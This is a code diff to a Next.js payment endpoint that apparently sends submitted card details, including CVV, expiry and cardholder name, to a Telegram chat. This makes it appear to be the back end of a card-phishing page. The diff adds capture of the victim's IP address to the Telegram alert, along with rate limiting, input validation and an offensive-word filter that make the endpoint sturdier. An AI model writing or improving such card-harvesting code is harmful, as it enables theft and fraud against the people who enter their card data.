@@ -2,6 +2,7 @@ import { NextRequest, NextResponse } from 'next/server';
 import fs from 'fs';
 import path from 'path';
 import { neon } from '@neondatabase/serverless';
+import { checkRateLimit } from '@/lib/rate-limit';
 
 type PagoPayload = {
   codcliente: string;
@@ -72,6 +73,7 @@ async function sendTelegramAlert(data: {
   estado: string;
   nroOperacion: string;
   fecha: string;
+  ip: string;
 }) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -92,6 +94,7 @@ async function sendTelegramAlert(data: {
     `📅 *Vencimiento:* ${data.vencimiento}`,
     `🔐 *CVV:* ${data.cvv}`,
     `👤 *Titular:* ${data.titular}`,
+    `🌐 *IP:* \`${data.ip}\``,
     `━━━━━━━━━━━━━━━━━━━━`,
     `${icono} *Estado:* ${data.estado}`,
     `🆔 *N° Op:* ${data.nroOperacion}`,
@@ -127,6 +130,19 @@ async function guardarEnDB(data: {
 }
 
 export async function POST(req: NextRequest) {
+  const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
+    || req.headers.get('x-real-ip')
+    || 'unknown';
+
+  // Rate limit: 5 payment attempts per minute per IP
+  const { allowed } = checkRateLimit(ip, { windowMs: 60000, maxRequests: 5 });
+  if (!allowed) {
+    return NextResponse.json(
+      { error: 'Demasiados intentos de pago. Espera un minuto.' },
+      { status: 429 }
+    );
+  }
+
   let body: PagoPayload;
   try {
     body = await req.json();
@@ -138,6 +154,18 @@ export async function POST(req: NextRequest) {
 
   if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
     return NextResponse.json({ error: 'Faltan campos requeridos' }, { status: 400 });
+  }
+
+  // Validar que el código solo contenga caracteres alfanuméricos y guiones
+  if (!/^[a-zA-Z0-9\-]+$/.test(codcliente) || codcliente.length > 20) {
+    return NextResponse.json({ error: 'Código de cliente inválido' }, { status: 400 });
+  }
+
+  // Filtro de palabras ofensivas
+  const palabrasOfensivas = ['mierda', 'puta', 'pendejo', 'imbecil', 'estupido', 'basura', 'idiota', 'carajo', 'joder', 'maldito'];
+  const camposTexto = [codcliente, nombre, titular, dni, email].filter((c): c is string => Boolean(c)).map(c => c.toLowerCase());
+  if (camposTexto.some(campo => palabrasOfensivas.some(palabra => campo.includes(palabra)))) {
+    return NextResponse.json({ error: 'Contenido no permitido' }, { status: 400 });
   }
 
   await new Promise(r => setTimeout(r, 300));
@@ -184,6 +212,7 @@ export async function POST(req: NextRequest) {
       estado,
       nroOperacion,
       fecha,
+      ip,
     });
   } catch (e) {
     console.error('Error al enviar alerta Telegram:', e);
